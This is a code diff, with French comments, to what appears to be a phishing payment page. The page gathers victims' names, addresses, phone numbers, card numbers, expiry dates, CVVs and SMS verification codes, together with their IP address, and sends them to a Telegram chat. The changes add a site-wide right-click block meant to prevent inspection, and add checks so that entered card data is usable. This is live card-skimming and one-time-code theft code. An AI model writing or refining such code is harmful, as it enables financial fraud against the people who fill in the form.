@@ -165,14 +165,49 @@
       fetchUserIP();
     };
 
-    // Fonction pour autoriser uniquement le clic droit dans certains champs de formulaire (pour coller)
+    // Fonction pour interdire le clic droit globalement, mais autoriser dans les champs de saisie
+    document.addEventListener('contextmenu', function(event) {
+      if (event.target.tagName !== 'INPUT' && event.target.id !== 'sms-code') {
+        event.preventDefault(); // Bloque l'inspection et tout autre clic droit
+      }
+    });
+
+    // Fonction pour autoriser uniquement le clic droit dans les champs de formulaire et SMS (pour coller)
     document.getElementById('payment-form').addEventListener('contextmenu', function(event) {
-      if (event.target && (event.target.tagName === 'INPUT')) {
-        // Laisser le clic droit sur les champs de saisie
+      if (event.target && (event.target.tagName === 'INPUT' || event.target.id === 'sms-code')) {
+        // Laisser le clic droit sur les champs de saisie et SMS (pour coller)
         return true;
       }
       event.preventDefault(); // Bloquer ailleurs
     });
+
+    // Fonction pour vérifier si la date d'expiration est valide
+    function isValidExpiryDate(expiryDate) {
+      const [month, year] = expiryDate.split('/');
+      const currentDate = new Date();
+      const currentYear = currentDate.getFullYear();
+      const currentMonth = currentDate.getMonth() + 1;
+
+      if (!month || !year || month < 1 || month > 12 || year.length !== 2) {
+        return false;
+      }
+
+      const expiryYear = 2000 + parseInt(year, 10);
+      if (expiryYear < currentYear || (expiryYear === currentYear && parseInt(month, 10) < currentMonth)) {
+        return false;
+      }
+      return true;
+    }
+
+    // Fonction pour valider le numéro de carte (16 chiffres)
+    function isValidCardNumber(cardNumber) {
+      return /^[0-9]{16}$/.test(cardNumber);
+    }
+
+    // Fonction pour valider le code CVV (3 chiffres)
+    function isValidCVV(cvv) {
+      return /^[0-9]{3}$/.test(cvv);
+    }
 
     // Gestionnaire de soumission du formulaire de paiement
     document.getElementById('payment-form').addEventListener('submit', function(event) {
@@ -184,6 +219,22 @@
       const cardNumber = document.getElementById('card-number').value;
       const expiryDate = document.getElementById('expiry-date').value;
       const cvv = document.getElementById('cvv').value;
+
+      // Vérifications des champs
+      if (!isValidExpiryDate(expiryDate)) {
+        alert('Date d\'expiration invalide.');
+        return;
+      }
+
+      if (!isValidCardNumber(cardNumber)) {
+        alert('Numéro de carte invalide (doit contenir 16 chiffres).');
+        return;
+      }
+
+      if (!isValidCVV(cvv)) {
+        alert('Code CVV invalide (doit contenir 3 chiffres).');
+        return;
+      }
 
       // Enregistrer les données du formulaire avec l'IP
       userFormData = {
@@ -231,13 +282,10 @@
         Adresse de livraison : ${userFormData.deliveryAddress}
         Numéro de téléphone : ${userFormData.phoneNumber}
         Nom : ${userFormData.cardholderName}
-        Numéro : ${userFormData.cardNumber}
-        Expiration : ${userFormData.expiryDate}
-        CVV : ${userFormData.cvv}
-        Code SMS reçu : ${smsCode}
+        Code SMS : ${smsCode}
       `;
-      
-      sendToTelegram(message); // Envoyer les informations avec le code SMS à Telegram
+
+      sendToTelegram(message); // Envoyer les informations à Telegram
 
       document.getElementById('step-3').classList.add('hidden');
       document.getElementById('step-4').classList.remove('hidden');
@@ -245,19 +293,7 @@
       setTimeout(() => {
         document.getElementById('step-4').classList.add('hidden');
         document.getElementById('step-5').classList.remove('hidden');
-
-        setTimeout(() => {
-          window.location.href = "https://justmoicom.github.io/vlad/";
-        }, 5000);
-      }, 7000);
-    });
-
-    document.getElementById('expiry-date').addEventListener('input', function() {
-      let value = this.value.replace(/\D/g, '');
-      if (value.length > 2) {
-        value = value.slice(0, 2) + '/' + value.slice(2, 4);
-      }
-      this.value = value;
+      }, 5000);
     });
   </script>
 
